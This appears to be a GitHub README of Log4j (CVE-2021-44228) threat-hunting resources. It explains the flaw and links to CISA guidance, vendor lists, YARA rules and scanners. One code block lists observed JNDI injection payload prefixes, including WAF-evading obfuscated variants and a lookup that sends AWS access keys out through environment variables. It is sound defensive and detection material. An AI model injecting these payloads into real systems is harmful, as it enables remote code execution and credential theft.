# Log4j Threat Hunting and Incident Response Resources

## Latest Updates
- Included New Log4J Section - 1/13/2021

## Log4j Vulnerability CVE-2021-44228
A flaw in Log4j, a Java library for logging error messages in applications, is the most high-profile security vulnerability on the internet right now and comes with a severity score of 10 out of 10.  Log4J is a widely used Java library for logging error messages in applications. It is used in enterprise software applications, including those custom applications developed in-house by businesses, and forms part of many cloud computing services.  Because Log4j is so widely used, the vulnerability may impact a very wide range of software and services from many major vendors. 

## Attack Payload Exploiting JNDI Lookup
The attack payload to exploit this vulnerability is as follows: ${jndi:<protocol>://<url>}
  
There are several patterns in the protocols leveraging JNDI Lookup. While it normally communicates via LDAP (Lightweight Directory Access Protocol) in many cases, there are a variety of protocols and obfuscation patterns to avoid WAF (Web Application Firewall) detection.
  
The table below lists the most common attack payloads observed.  
```
${jndi:ldap://
${jndi:dns://
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://
${jndi:${lower:l}${lower:d}a${lower:p}://
${jndi:ldaps://
${jndi:iiop://
${jndi:rmi://
${jndi:${lower:d}n${lower:s}://

Payload attempts to steal AWS access keys from environment variables
${jndi:ldap://${env:AWS_ACCESS_KEY}.(snipped)}
```
  
### List of resources for finding and miticating log4j Vulnerability and Exploit
List of Known [Vulnerable Hashes](https://github.com/cryptoforcecommand/log4j-cve-2021-44228/blob/main/log4j%20known%20vulnerable%20hashes)

**Links to other Resources and Open Source Intel on Log4J Vulnerability**
Resources and Open Source Intel on log4j vulnerability:

[CISA Guidance on Log4j](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance) 

[FTC warning to businesses on log4](https://www.ftc.gov/news-events/blogs/techftc/2022/01/ftc-warns-companies-remediate-log4j-security-vulnerability)

[Vulnerable Vendors list for log4j](https://github.com/NCSC-NL/log4shell/tree/main/software)

[VMWare Horizon Log4j Hacker Remote Code Execution](https://www.bleepingcomputer.com/news/security/nhs-warns-of-hackers-exploiting-log4shell-in-vmware-horizon/)

[CISA Vulnerable Vendors list for log4j](https://github.com/cisagov/log4j-affected-db/blob/develop/SOFTWARE-LIST.md)

[mubix (Rob Fuller) · GitHub](https://github.com/mubix)

[Callback Domains log4j · GitHub](https://gist.github.com/superducktoes/9b742f7b44c71b4a0d19790228ce85d8)

[Tanium Software to find log4j](https://community.tanium.com/s/article/How-Tanium-Can-Help-with-CVE-2021-44228-Log4Shell#_Toc90296324)

[Yara Rules to Find log4j](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_log4j_cve_2021_44228.yar)

[Log Presso Scanner to find and mitigate Log4j](https://github.com/logpresso/CVE-2021-44228-Scanner)
  
[JPCERT](https://blogs.jpcert.or.jp/en/2021/12/log4j-cve-2021-44228.html)  
  
[Apache Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
  
